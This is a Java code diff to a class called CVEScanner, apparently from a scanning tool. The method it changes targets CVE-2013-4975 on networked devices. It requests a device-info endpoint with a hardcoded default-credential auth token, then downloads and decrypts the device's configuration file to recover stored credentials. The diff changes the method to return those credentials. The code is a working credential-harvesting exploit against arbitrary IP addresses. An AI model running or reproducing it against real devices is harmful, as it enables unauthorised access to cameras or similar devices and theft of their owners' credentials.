@@ -1,19 +1,18 @@
 package scanner.cve;
 
-import lombok.extern.slf4j.Slf4j;
 import okhttp3.Response;
 import okhttp3.ResponseBody;
 import scanner.http.HttpClient;
 
 import java.io.IOException;
 import java.util.Objects;
+import java.util.Optional;
 
 /**
  * Basic CVE scanning class.
  *
  * @author inkarnadin
  */
-@Slf4j
 public class CVEScanner {
 
     private static final String CVE_2013_4975 = "http://%s/system/deviceInfo?auth=YWRtaW46MTIzNDU=";
@@ -23,24 +22,24 @@ public class CVEScanner {
      * Checks target address for vulnerability to CVE-2013-4975.
      *
      * @param ip target IP address.
+     * @return result of cve scanning
      */
-    public static void scanning(String ip) {
+    public static Optional<String> scanning(String ip) {
         try (Response response = HttpClient.execute(String.format(CVE_2013_4975, ip))) {
             ResponseBody responseBody = response.body();
             if (Objects.nonNull(responseBody)) {
                 String body = responseBody.string();
                 if (body.contains("firmwareVersion")) {
-                    String credentials;
                     try (Response configFile = HttpClient.execute(String.format(CONFIG_FILE, ip))) {
                         ResponseBody configFileBody = configFile.body();
-                        credentials = (Objects.nonNull(configFileBody))
-                                ? " => " + ConfigurationDecrypt.decrypt(configFileBody.byteStream())
-                                : "";
+                        return (Objects.nonNull(configFileBody))
+                                ? ConfigurationDecrypt.decrypt(configFileBody.byteStream())
+                                : Optional.empty();
                     }
-                    log.info(ip + credentials);
                 }
             }
         } catch (IOException ignored) {}
+        return Optional.empty();
     }
 
 }
